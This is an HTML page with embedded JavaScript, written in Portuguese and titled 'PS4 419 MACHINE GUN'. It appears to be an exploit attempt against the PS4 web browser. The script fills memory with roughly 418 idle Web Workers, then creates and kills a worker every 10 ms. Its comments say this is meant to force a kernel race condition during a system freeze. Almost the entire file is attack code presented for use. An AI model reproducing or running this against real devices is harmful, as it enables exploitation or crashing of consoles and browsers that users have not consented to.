<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 419 MACHINE GUN</title>
    <style>
        body { 
            background-color: #100; 
            color: #f00; 
            font-family: 'Courier New', monospace; 
            text-align: center; 
            padding: 20px;
            display: flex; flex-direction: column; justify-content: center; height: 90vh;
        }
        h1 { margin: 0; font-size: 2em; color: #f00; text-shadow: 0 0 10px #f00; }
        #counter { font-size: 8em; font-weight: bold; margin: 20px 0; color: #fff; }
        #status { font-size: 1.5em; border: 2px solid #500; padding: 15px; background: #200; color: #f88; }
        
        .countdown { color: #ff0 !important; border-color: #ff0 !important; }
        .firing { 
            background-color: #f00 !important; 
            color: #fff !important; 
            animation: shake 0.1s infinite; 
        }
        
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            10% { transform: translate(-1px, -2px) rotate(-1deg); }
            20% { transform: translate(-3px, 0px) rotate(1deg); }
            30% { transform: translate(3px, 2px) rotate(0deg); }
            40% { transform: translate(1px, -1px) rotate(1deg); }
            50% { transform: translate(-1px, 2px) rotate(-1deg); }
            60% { transform: translate(-3px, 1px) rotate(0deg); }
            70% { transform: translate(3px, 1px) rotate(-1deg); }
            80% { transform: translate(-1px, -1px) rotate(1deg); }
            90% { transform: translate(1px, 2px) rotate(0deg); }
            100% { transform: translate(1px, -2px) rotate(-1deg); }
        }
    </style>
</head>
<body>

    <h1>MACHINE GUN 419</h1>
    <div id="status">CARREGANDO MUNIÇÃO...</div>
    <div id="counter">0</div>

    <script>
        // CONFIGURAÇÃO DE COMBATE
        const TARGET_HOVER = 418;  
        const WAIT_TIME_MS = 4000; // 4s de silêncio antes do ataque
        const FIRE_RATE_MS = 10;   // 10ms entre disparos (Muito rápido!)

        let workers = [];
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        
        // Kamikaze Ultraleve
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function updateDisplay() {
            document.getElementById('counter').innerText = workers.length;
        }

        // FASE 1: Subida Segura
        function startClimb() {
            let i = setInterval(() => {
                if (workers.length < 400) {
                    for(let k=0; k<5; k++) workers.push(new Worker(url));
                } else if (workers.length < TARGET_HOVER) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    updateDisplay();
                    startCountdown();
                    return;
                }
                updateDisplay();
            }, 50);
        }

        // FASE 2: Silêncio Tático (4s)
        function startCountdown() {
            const status = document.getElementById('status');
            status.className = "countdown";
            let timeLeft = WAIT_TIME_MS / 1000;
            
            const timer = setInterval(() => {
                status.innerText = `ALVO TRAVADO. FOGO EM ${timeLeft.toFixed(1)}s...`;
                timeLeft -= 0.1;
                
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    openFire();
                }
            }, 100);
        }

        // FASE 3: Rajada Contínua (Metralhadora)
        function openFire() {
            const status = document.getElementById('status');
            status.className = "firing";
            status.innerText = ">>> DISPARANDO RAJADA <<<";

            // Loop de ataque contínuo
            setInterval(() => {
                try {
                    // Cria e mata em alta velocidade para forçar a Race Condition
                    // durante o "congelamento" do sistema
                    const w = new Worker(killerUrl);
                    w.terminate();
                } catch(e) {
                    // Se falhar (Kernel Full), não para. Tenta de novo imediatamente.
                }
            }, FIRE_RATE_MS);
        }

        // Início
        setTimeout(startClimb, 2000);

    </script>
</body>
</html>
